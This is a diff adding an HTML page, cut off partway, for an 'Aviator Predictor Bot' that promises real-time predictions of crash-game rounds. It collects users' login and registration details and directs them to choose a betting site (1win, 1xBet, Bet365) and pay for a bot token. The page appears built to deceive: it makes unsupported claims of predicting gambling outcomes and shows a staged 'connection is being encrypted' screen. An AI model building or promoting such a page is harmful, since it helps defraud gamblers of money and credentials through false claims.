@@ -1,0 +1,2325 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Aviator Predictor Bot</title>
+    <link rel="icon" href="favicon.jpg?v=2025-08-31" type="image/x-icon">
+    <link rel="shortcut icon" href="favicon.jpg?v=2025-08-31" type="image/x-icon">
+    <link rel="apple-touch-icon" href="favicon.jpg?v=2025-08-31">
+    <link rel="stylesheet" href="styles.css?v=2025-09-04">
+    <link rel="stylesheet" href="botstyles.css?v=2025-09-04-no-rotation">
+    <style>
+        .payment-option {
+            cursor: pointer;
+            transition: all 0.3s ease;
+            border: 2px solid transparent;
+            border-radius: 8px;
+            padding: 15px;
+            margin: 10px 0;
+            background: #2c2d35;
+            color: #fff;
+            text-align: center;
+        }
+        .payment-option:hover {
+            background: #3c3d45;
+            border-color: #007bff;
+        }
+        .payment-option.selected {
+            background: #007bff;
+            border-color: #0056b3;
+            color: white;
+        }
+        .complete-payment-btn:hover {
+            background: #e55a2b !important;
+            transform: translateY(-2px);
+        }
+        .activate-bot-btn {
+            transition: all 0.3s ease;
+        }
+        .activate-bot-btn:hover {
+            background: #218838 !important;
+            transform: translateY(-2px);
+        }
+        .payment-details {
+            transition: all 0.3s ease;
+        }
+        
+        /* Modal Improvements */
+        .modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.8);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            padding: 20px;
+            box-sizing: border-box;
+        }
+        .modal.hidden {
+            display: none;
+        }
+        .modal-content {
+            background: #1a1b21;
+            border-radius: 12px;
+            max-width: 500px;
+            width: 100%;
+            max-height: 90vh;
+            overflow-y: auto;
+            position: relative;
+        }
+        .payment-header {
+            padding: 20px;
+            border-bottom: 1px solid #333;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .payment-body {
+            padding: 20px;
+        }
+        .close-payment {
+            font-size: 24px;
+            cursor: pointer;
+            color: #ccc;
+        }
+        .close-payment:hover {
+            color: #fff;
+        }
+        
+        /* Responsive Design */
+        @media (max-width: 768px) {
+            .modal {
+                padding: 10px;
+            }
+            .modal-content {
+                max-height: 95vh;
+            }
+            .payment-header, .payment-body {
+                padding: 15px;
+            }
+        }
+        
+        /* Logout Button Styles */
+        .logout-btn {
+            margin-left: 10px;
+            padding: 8px;
+            cursor: pointer;
+            border-radius: 4px;
+            color: #ccc;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .logout-btn:hover {
+            background: rgba(255, 0, 0, 0.2);
+            color: #ff4444;
+        }
+        
+        /* User Badge Layout */
+        .user-badge {
+            display: flex;
+            align-items: center;
+        }
+        
+        /* Enhanced Game Container Layout */
+        .game-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: space-between;
+            min-height: 500px;
+            max-height: 90vh;
+            position: relative;
+            overflow-y: auto;
+            padding: 20px;
+            box-sizing: border-box;
+        }
+        
+        /* Footer positioning within game container */
+        .game-container .bot-footer {
+            width: 100%;
+            margin-top: auto;
+            padding: 18px;
+            text-align: center;
+            opacity: 0.9;
+            border-top: 1px solid rgba(255,255,255,0.08);
+            background: rgba(0,0,0,0.2);
+            border-radius: 0 0 18px 18px;
+        }
+        
+        /* Game content area */
+        .game-content {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: flex-start;
+            width: 100%;
+            min-height: fit-content;
+        }
+        
+        /* Activation overlay positioning */
+        .activation-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0,0,0,0.85);
+            border-radius: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 10;
+        }
+    </style>
+</head>
+<body class="bot-dark">
+    <div class="bot-center" id="bot-loading">
+        <h2>Navigating to secure bot website...</h2>
+        <p>Please wait while your connection is being encrypted</p>
+        <div style="margin:24px 0;">
+            <i class="fas fa-lock fa-3x" style="color:#f1c40f;"></i>
+        </div>
+    </div>
+    <div class="bot-center hidden" id="bot-login">
+        <h2>Aviator Predictor Bot</h2>
+        <form id="loginForm">
+            <input class="bot-input" type="text" name="contact" placeholder="Mobile Number or Email" required><br>
+            <input class="bot-input" type="password" name="password" placeholder="Password" required><br>
+            <button class="bot-btn" type="submit">Login</button>
+        </form>
+        <div style="text-align: center; margin-top: 15px;">
+            <a href="#" id="registerLink" style="color: #4CAF50; text-decoration: none; font-size: 14px;">Don't have an account? Register here</a>
+        </div>
+    </div>
+    <div class="bot-center hidden" id="bot-register">
+        <h2>Register New Account</h2>
+        <form id="registerForm">
+            <input class="bot-input" type="email" name="email" placeholder="Email Address" required><br>
+            <input class="bot-input" type="tel" name="phone" placeholder="Phone Number" required><br>
+            <input class="bot-input" type="password" name="password" placeholder="Create Password" required><br>
+            <input class="bot-input" type="password" name="confirmPassword" placeholder="Confirm Password" required><br>
+            <button class="bot-btn" type="submit">Register</button>
+        </form>
+        <div style="text-align: center; margin-top: 15px;">
+            <a href="#" id="loginLink" style="color: #4CAF50; text-decoration: none; font-size: 14px;">Already have an account? Login here</a>
+        </div>
+    </div>
+    <div class="hidden" id="bot-main">
+        <div class="hidden" id="bot-server-loading" style="width:100vw;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;background:radial-gradient(ellipse at center, #2c2d35 0%, #1a1b21 50%, #0f1014 100%);">
+            <h2 style="color:#f1c40f;">Loading Bot Server...</h2>
+            <p style="margin-top:12px;">Please wait while we connect you to the Aviator Game Predictor Bot server.</p>
+            <div style="margin:32px 0;"><i class="fas fa-server fa-3x" style="color:#e74c3c;"></i></div>
+        </div>
+        <div class="hidden bot-server" id="bot-server-main">
+            <header class="bot-header">
+                <div class="brand">Aviator Predictor Bot</div>
+                <div class="user-badge">
+                    <div class="user-avatar"><i class="fas fa-user"></i></div>
+                    <div class="user-contact" id="userContact">User</div>
+                    <div class="logout-btn" id="logoutBtn" onclick="logoutUser()" title="Logout">
+                        <i class="fas fa-sign-out-alt"></i>
+                    </div>
+                </div>
+            </header>
+            <div class="bot-container">
+            <div class="card" style="margin-bottom:16px;">
+                <div class="bot-plane"><i class="fas fa-paper-plane"></i></div>
+                <h2 style="font-size:2em;margin-bottom:8px;">Avisignals Bot Server</h2>
+                <div style="max-width:800px;margin:0 auto 16px;">Welcome to the live bot server. Here you will receive real-time Aviator predictions. Press Start Bot to begin.</div>
+            </div>
+
+            <li> Select your betting site and wait for the bot to connect.</li>
+            <li> Click on Activate Bot</li>
+            <li> Select your Bot token and complete payment</li>
+            <li> Enter your token and activate the bot</li>
+            <li>Click Predict to get next predicted round</li>
+            
+            <button class="bot-btn" id="startBotBtn">Start Bot</button>
+            <div class="hidden" id="botStatus" style="margin-top:24px;">
+                <div class="bot-status connecting-dots" id="statusMsg">Connecting to website</div>
+            </div>
+            <div class="hidden" id="siteSelect">
+                <div style="font-size:1.1em;margin-bottom:8px;">Select Betting Site:</div>
+                <div class="site-options">
+                    <button class="site-btn" data-site="1win"><img src="data:image/jpeg;base64,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" alt="1win" style="height:32px;vertical-align:middle;"> 1win</button>
+                    <button class="site-btn" data-site="1xBet"><img src="data:image/png;base64,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" alt="1xBet" style="height:32px;vertical-align:middle;"> 1xBet</button>
+                    <button class="site-btn" data-site="Bet365"><img src="data:image/png;base64,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" alt="Bet365" style="height:32px;vertical-align:middle;"> Bet365</button>
